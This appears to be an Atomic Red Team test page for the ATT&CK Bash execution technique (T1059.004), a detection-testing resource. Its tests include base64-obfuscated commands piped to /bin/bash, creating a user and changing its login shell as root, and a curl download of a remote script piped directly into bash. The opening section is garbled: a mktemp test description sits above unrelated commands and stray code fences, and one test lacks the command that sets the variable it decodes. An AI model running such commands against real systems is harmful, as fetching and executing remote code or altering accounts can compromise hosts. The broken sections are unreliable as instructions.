# T1059.004 - Command and Scripting Interpreter: Bash
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1059/004)
<blockquote>Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.</blockquote>

An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.

**Supported Platforms:** Linux

echo $0
if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi
if $(printenv SHELL >/dev/null); then printenv SHELL; fi
```






<br/>
<br/>

```






<br/>
<br/>

## Atomic Test #8 - Command line scripts
An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!

**Supported Platforms:** Linux


**auto_generated_guid:** b04ed73c-7d43-4dc8-b563-a2fc595cba1a






#### Attack Commands: Run with `sh`! 


```sh
for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done
```






<br/>
<br/>

## Atomic Test #9 - Obfuscated command line scripts
An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.

**Supported Platforms:** Linux


**auto_generated_guid:** 5bec4cc8-f41e-437b-b417-33ff60acf9af






#### Attack Commands: Run with `sh`!

echo "\$ART=$ART"
echo -n "$ART" |base64 -d |/bin/bash
unset ART
```






<br/>
<br/>

## Atomic Test #10 - Change login shell
An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user.

**Supported Platforms:** Linux


**auto_generated_guid:** c7ac59cb-13cc-4622-81dc-6d2fee9bfac7






#### Attack Commands: Run with `bash`!  Elevation Required (e.g. root or admin) 


```bash
useradd -s /bin/bash art
cat /etc/passwd |grep ^art
chsh -s /bin/sh art
cat /etc/passwd |grep ^art
```

#### Cleanup Commands:
```bash
userdel art
```



#### Dependencies:  Run with `bash`!
##### Description: chsh - change login shell, must be installed
##### Check Prereq Commands:
```bash
if [ -f /usr/bin/chsh ]; then echo "exit 0"; else echo "exit 1"; exit 1; fi
```
##### Get Prereq Commands:
```bash
echo "Automated installer not implemented yet, please install chsh manually"
```




<br/>
<br/>

## Atomic Test #11 - Environment variable scripts
An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash

**Supported Platforms:** Linux


**auto_generated_guid:** bdaebd56-368b-4970-a523-f905ff4a8a51






#### Attack Commands: Run with `bash`! 


```bash
export ART='echo "Atomic Red Team was here... T1059.004"'
echo $ART |/bin/bash
```

#### Cleanup Commands:
```bash
unset ART
```





<br/>
<br/>

## Atomic Test #12 - Detecting pipe-to-shell
An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.

**Supported Platforms:** Linux


**auto_generated_guid:** fca246a8-a585-4f28-a2df-6495973976a1





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_url | url of remote payload | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh|


#### Attack Commands: Run with `bash`! 


```bash
cd /tmp
curl -s #{remote_url}
ls -la /tmp/art.txt
curl -s #{remote_url} |bash
ls -la /tmp/art.txt
```

#### Cleanup Commands:
```bash
rm /tmp/art.txt
```



#### Dependencies:  Run with `bash`!
##### Description: Check if running on a Debian based machine.
##### Check Prereq Commands:
```bash
if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
```
##### Get Prereq Commands:
```bash
apt update && apt install -y curl
```
